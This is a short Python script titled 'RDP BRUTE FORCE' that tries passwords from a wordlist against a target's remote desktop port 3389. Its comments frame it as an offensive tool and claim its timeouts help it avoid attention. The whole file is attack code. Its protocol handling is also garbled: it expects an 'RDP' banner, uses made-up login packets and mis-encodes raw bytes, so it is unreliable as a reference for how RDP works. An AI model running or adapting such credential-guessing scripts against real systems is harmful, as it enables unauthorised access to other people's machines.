#!/usr/bin/python3

# Script:                        RDP BRUTE FORCE
# Author:                        Alex WIse
# Date of latest revision:       03/22/2023
# Purpose:                       RDP 3389 access

# Main
    # Replace line 17 with the file path to you wordlist of choice
        # The script will run continiously with connect time outs as to not attract too much attention 
            # USE YOUR BRAIN- Open intel is all around you. rebuild the list to use passwords from CF IE Solarwinds123


import socket

target_host = input("Enter the target IP address: ")
username = input("Enter the username: ")

with open("/home/eighty6face/Downloads/rockyou.txt", "r") as f:
    for line in f:
        password = line.strip()
        print(f"Trying {username}:{password}")
        try:
            # Create a socket object
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect the client
            client.connect((target_host, 3389))

            # Receive the banner
            banner = client.recv(1024).decode()
            if "RDP" not in banner:
                print("[-] This is not an RDP service")
                client.close()
                break

            # Send the connection request
            client.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")

            # Receive the response
            response = client.recv(1024)

            # Send the login credentials
            client.send(f"\x03\x00\x00\x2b\x08\xd0\x00\x00\x12\x34\x00\x0e\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00{username}\x00{password}\x00\x00\x00".encode())

            # Receive the authentication result
            result = client.recv(1024)

            if b"\x2e\x00\x00\x00" in result:
                print(f"[+] Login successful: {username}:{password}")
                break
            else:
                print("[-] Login failed")
        except socket.error:
            print("[-] Connection timed out")
            client.close()

            # End 
